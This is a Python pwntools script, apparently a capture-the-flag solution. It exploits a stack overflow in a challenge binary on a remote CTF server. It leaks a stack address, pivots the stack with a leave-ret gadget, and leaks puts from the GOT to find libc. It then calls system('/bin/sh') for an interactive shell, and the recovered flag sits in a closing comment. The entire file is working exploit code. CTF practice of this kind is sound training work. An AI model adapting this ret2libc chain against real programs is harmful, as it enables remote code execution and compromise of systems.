#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF("./chall_patched")
libc = ELF("./libc.so.6")

def get_stack_leak():
    p.recvuntil(b'This may help: ')
    leak = int(p.recvline().strip(), 16)
    log.info(f"Leaked stack address: {hex(leak)}")
    return leak

# p = process(exe.path)
p = remote('chall.v1t.site', 30150)

pop_rdi = 0x401214
leave_ret = 0x401259

stack_leak = get_stack_leak()
payload = p64(0x0)  # fake rbp for vuln function
payload += p64(pop_rdi)
payload += p64(exe.got.puts)
payload += p64(exe.plt.puts)
payload += p64(exe.symbols.vuln)
payload += b'A' * (96 - len(payload))
payload += p64(stack_leak)
payload += p64(leave_ret)

p.sendline(payload)

leak_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info(f"Leaked puts address: {hex(leak_puts)}")

leak_libc = leak_puts - libc.symbols.puts
log.info(f"Leaked libc address: {hex(leak_libc)}")

bin_sh = leak_libc + next(libc.search(b"/bin/sh\x00"))
log.info(f"Leaked /bin/sh address: {hex(bin_sh)}")
system = leak_libc + libc.symbols.system
log.info(f"Leaked system address: {hex(system)}")

stack_leak = get_stack_leak()
payload = p64(0x0)  # fake rbp for vuln function
payload += p64(pop_rdi)
payload += p64(bin_sh)
payload += p64(0x40101a)    #gadget ret for alignment
payload += p64(system)
payload += b'A' * (96 - len(payload))
payload += p64(stack_leak)
payload += p64(leave_ret)

p.sendline(payload)
p.interactive()
#v1t{l34v3_r3t_rul3z_7h3_r0p_c7e9d46b43370b38f661b25166253d38}